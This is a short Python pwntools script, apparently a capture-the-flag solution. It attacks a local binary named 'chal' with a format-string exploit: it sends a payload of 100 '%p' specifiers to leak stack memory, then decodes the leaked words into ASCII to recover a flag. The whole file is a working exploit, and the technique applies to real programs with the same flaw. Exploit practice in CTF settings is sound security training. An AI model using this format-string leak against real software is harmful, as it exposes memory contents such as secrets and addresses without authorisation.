#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./chal')
context.log_level = 'info'

def extract_flag(leak):
    words = leak.split(".")
    flag_words = []
    collecting = False

    for w in words:
        if w in ["(nil)", "0x0"]:
            continue
        try:
            # Convert 64-bit word to bytes in little-endian
            b = int(w, 16).to_bytes(8, 'little')
        except:
            continue
        # Keep all printable ASCII including space
        s = ''.join(chr(c) for c in b if 32 <= c < 127)
        # Start collecting at first printable chunk
        if not collecting and any(32 <= c < 127 for c in b):
            collecting = True
        if collecting:
            flag_words.append(s)
            if "}" in s:
                break

    return ''.join(flag_words)

def main():
    p = process('./chal')

    # Spray enough %p to capture the flag
    payload = (("%p." * 100)[:-1]).encode()
    p.clean()
    p.sendline(payload)

    leak = p.recvall(timeout=2).decode(errors='ignore')
    log.info(leak)

    flag = extract_flag(leak)
    log.success("Recovered flag: " + flag)

if __name__ == "__main__":
    main()
